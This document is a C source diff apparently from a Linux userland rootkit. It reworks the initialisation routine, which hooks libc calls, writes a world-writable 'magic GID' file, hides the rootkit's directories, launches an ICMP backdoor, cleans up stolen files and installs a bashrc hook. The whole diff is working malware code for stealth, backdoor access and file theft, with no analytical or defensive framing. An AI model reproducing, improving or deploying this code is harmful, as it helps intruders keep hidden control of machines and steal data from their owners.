@@ -26,10 +26,13 @@ typedef struct {
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
-#include <sys/mman.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+
+#ifdef FILE_STEAL
+#include <sys/mman.h>
+#endif
 
 #ifdef HIDE_PORTS
 #include <linux/netlink.h>
@@ -64,33 +67,34 @@ void plsdomefirst(void){
     if(notuser(0) || rknomore())
         return;
 
+    gid_t magicgid = readgid();
 #ifdef USE_ICMP_BD
     spawnpdoor();
 #endif
 #ifdef READ_GID_FROM_FILE
     hook(CACCESS,CFOPEN,CCHMOD);
-    if((long)call(CACCESS, GID_PATH, F_OK) != 0){
+    if((long)call(CACCESS, GID_PATH, F_OK) != 0 && errno == ENOENT){
         FILE *fp = call(CFOPEN, GID_PATH, "w");
         if(fp != NULL){
-            fprintf(fp, "%u", (gid_t)MAGIC_GID);
+            fprintf(fp, "%u", magicgid);
             fclose(fp);
+            chown_path(GID_PATH, magicgid);
             call(CCHMOD, GID_PATH, 0666);
         }
     }
 #endif
-    gid_t magicgid = readgid();
     preparedir(HOMEDIR, magicgid);
     hidedircontents(HOMEDIR, magicgid);
     hidedircontents(INSTALL_DIR, magicgid);
 #if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
     cleanstolen();
 #endif
-#ifdef ROOTKIT_BASHRC
-    checkbashrc();
-#endif
 #ifdef CLEANSE_HOMEDIR
     if(!magicusr() && !rkprocup())
         bdvcleanse();
+#endif
+#ifdef ROOTKIT_BASHRC
+    checkbashrc();
 #endif
 #if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
     gidchanger();
